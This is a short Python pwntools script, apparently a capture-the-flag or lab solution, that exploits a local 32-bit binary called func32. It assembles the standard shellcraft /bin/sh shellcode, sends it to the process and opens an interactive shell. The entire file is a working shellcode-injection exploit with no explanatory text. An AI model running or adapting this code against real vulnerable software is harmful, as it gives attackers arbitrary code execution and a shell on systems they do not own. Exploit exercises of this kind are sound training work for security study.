from pwn import *
context.arch = "i386"
#context.log_level = "debug"
p = process("./func32")
print shellcraft.sh()
payload = asm(shellcraft.sh())
#gdb.attach(p)
p.sendline(payload)
p.interactive()


